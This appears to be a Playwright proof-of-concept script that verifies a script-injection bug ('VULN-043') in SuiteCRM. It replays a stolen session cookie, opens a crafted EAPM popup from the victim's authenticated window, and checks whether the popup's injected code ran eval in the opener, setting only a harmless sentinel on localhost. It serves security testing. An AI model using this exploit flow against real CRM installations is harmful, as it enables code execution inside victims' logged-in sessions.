// VULN-043 — Playwright DOM-execution proof.
// Sets up a genuine opener/popup relationship: an "opener" page (the
// victim's own authenticated SuiteCRM window) calls window.open() on the
// crafted EAPM URL. The popup's injected script runs
// window.opener.eval("top.__vuln043_fired=true"), which (indirect eval)
// executes in the OPENER's global scope. We assert the sentinel on the
// OPENER page, not the popup -- that's the whole point of the bug.
const { chromium } = require('playwright');
const fs = require('fs');
const path = require('path');

const HERE = '/work/exploits/VULN-043';

(async () => {
  const state = JSON.parse(fs.readFileSync(path.join(HERE, 'state.json'), 'utf8'));
  const evidenceDir = path.join(HERE, 'evidence');
  fs.mkdirSync(evidenceDir, { recursive: true });

  const browser = await chromium.launch();
  const context = await browser.newContext();
  await context.addCookies([{
    name: state.cookieName,
    value: state.cookieValue,
    domain: 'localhost',
    path: '/',
  }]);

  // The "opener" -- the victim's own authenticated SuiteCRM window.
  const opener = await context.newPage();
  console.log(`[INFO] opener: navigating to ${state.baseUrl}/index.php?module=Home&action=index`);
  try {
    await opener.goto(`${state.baseUrl}/index.php?module=Home&action=index`, { waitUntil: 'commit', timeout: 15000 });
  } catch (e) {
    console.log(`[INFO] opener navigation settled with: ${e.message}`);
  }

  let dialogMessage = null;
  opener.on('dialog', async (d) => { dialogMessage = d.message(); try { await d.dismiss(); } catch (e) {} });

  console.log(`[INFO] opener: window.open(${state.eapmUrl})`);
  const [popup] = await Promise.all([
    context.waitForEvent('page'),
    opener.evaluate((url) => { window.open(url, 'eapm_popup'); }, state.eapmUrl),
  ]);
  popup.on('dialog', async (d) => { dialogMessage = d.message(); try { await d.dismiss(); } catch (e) {} });

  try {
    await popup.waitForLoadState('load', { timeout: 15000 });
  } catch (e) {
    console.log(`[INFO] popup load settled with: ${e.message}`);
  }

  // Give the popup's inline <script> (window.opener.eval(...)) time to run.
  await opener.waitForTimeout(2000);

  let fired = false;
  try {
    fired = await opener.evaluate((sentinel) => !!window[sentinel], state.sentinel);
  } catch (e) {
    console.log(`[INFO] opener evaluate failed: ${e.message}`);
  }
  console.log(`[INFO] sentinel checked on the OPENER window (the victim's real session): ${fired}`);

  const result = { fired, dialogMessage };
  fs.writeFileSync(path.join(evidenceDir, 'result.json'), JSON.stringify(result, null, 2));
  console.log(`[RESULT] ${JSON.stringify(result)}`);

  try {
    await opener.screenshot({ path: path.join(evidenceDir, 'fired.png'), fullPage: true, timeout: 6000 });
  } catch (e) {
    console.log(`[INFO] high-level screenshot failed (${e.message}), falling back to raw CDP capture`);
    try {
      const cdp = await context.newCDPSession(opener);
      const shot = await cdp.send('Page.captureScreenshot', { format: 'png' });
      fs.writeFileSync(path.join(evidenceDir, 'fired.png'), Buffer.from(shot.data, 'base64'));
      console.log('[INFO] CDP screenshot fallback succeeded');
    } catch (e2) {
      console.log(`[INFO] CDP screenshot fallback also failed (non-fatal): ${e2.message}`);
    }
  }

  await browser.close();
})().catch((e) => {
  console.error('[FAIL]', e);
  fs.mkdirSync(path.join(HERE, 'evidence'), { recursive: true });
  const resultPath = path.join(HERE, 'evidence', 'result.json');
  if (!fs.existsSync(resultPath)) {
    fs.writeFileSync(resultPath, JSON.stringify({ fired: false, error: String(e) }));
  }
  process.exit(1);
});
